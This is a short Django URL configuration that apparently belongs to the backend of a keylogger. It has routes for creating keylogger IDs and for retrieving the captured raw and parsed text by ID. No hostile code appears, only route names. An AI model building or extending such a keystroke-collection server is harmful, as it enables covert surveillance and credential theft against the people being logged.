from django.urls import path

from .views import GetAllTextById, GetAllData, CreateId, GetDataById, GetParsedText

urlpatterns = [
    path('', GetAllData.as_view(), name='data_with_time'),
    path('create-keylogger', CreateId.as_view(), name='create_keylogger'),
    path('id/<pk>', GetDataById.as_view()),
    path('id/all_text/<pk>', GetAllTextById.as_view()),
    path('id/parsed_text/<pk>', GetParsedText.as_view())
]